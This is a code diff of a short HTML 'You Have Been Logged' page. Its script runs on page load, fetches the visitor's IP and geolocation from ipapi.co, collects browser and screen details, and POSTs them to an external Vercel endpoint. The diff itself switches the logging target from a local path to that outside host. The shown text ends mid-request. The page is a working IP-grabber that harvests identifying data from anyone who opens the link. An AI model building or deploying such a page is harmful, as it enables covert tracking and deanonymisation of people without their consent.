@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Logged</title>
+  <title>You Have Been Logged</title>
 </head>
 <body>
   <h1>You Have Been Logged</h1>
@@ -10,13 +9,11 @@
   <script>
   (async () => {
     const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-
     const visitorData = {
       ip: ipData.ip || "Unknown",
       city: ipData.city || "Unknown",
       region: ipData.region || "Unknown",
       country: ipData.country_name || "Unknown",
-      org: ipData.org || "Unknown",
       userAgent: navigator.userAgent,
       language: navigator.language,
       screenSize: `${screen.width}x${screen.height}`,
@@ -26,7 +23,7 @@
       localTime: new Date().toString(),
     };
 
-    await fetch("/api/log", {
+    await fetch("https://dontlarp153-github-io-pi.vercel.app/api/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(visitorData),
